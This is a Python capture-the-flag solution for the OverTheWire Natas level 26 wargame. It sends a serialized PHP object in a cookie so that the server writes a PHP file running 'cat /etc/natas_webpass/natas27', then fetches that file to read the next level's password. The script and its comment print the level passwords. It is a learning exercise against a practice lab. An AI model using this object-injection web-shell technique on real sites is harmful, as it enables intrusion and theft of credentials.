from bs4 import BeautifulSoup
import requests
import re

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)

def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())

lvl_name = 'natas26'
url = f'http://{lvl_name}.natas.labs.overthewire.org'

lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','8A506rfIAXbKKk68yJeuTuRq4UfcK70k')
my_cookies = {"drawing": 'Tzo2OiJMb2dnZXIiOjM6e3M6NzoiaW5pdE1zZyI7czo1MjoiPD9waHAgcGFzc3RocnUoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7czo3OiJleGl0TXNnIjtzOjUyOiI8P3BocCBwYXNzdGhydSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+IjtzOjc6ImxvZ0ZpbGUiO3M6MTk6ImltZy9teV9zb2x1dGlvbi5waHAiO30',"PHPSESSID":'4shfa9ihud70u6bm73g8keb2bh'}
my_params = {}
res, soup = make()
writeResponse()

url=f'http://{lvl_name}.natas.labs.overthewire.org/img/my_solution.php'

res, soup = make()
print(re.search(r"^[a-zA-Z0-9]{32}", soup.text)[0])
writeResponse()

'''
This one was INSANE! I feel like a God for solving it, straight up. It's an object injection puzzle, intended to
teach you the ways in which the PHP unserialize() function is totally insecure.
I passed in as my drawing a serialized, base64-encoded instance of the Logger class defined at the top
of the natas source file, with initMsg and exitMsg set to '<?php echo passthru("cat /etc/natas_webpass/natas27") ?>'
and the logFile variable set to "img/my_solution.php" (You gotta stick it in the img directory since you don't
have the permissions needed to write anywhere else.)
After that, you just need to request the php file you just created, and the password will be inside that very file!

Username: natas27
Password: PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3
'''
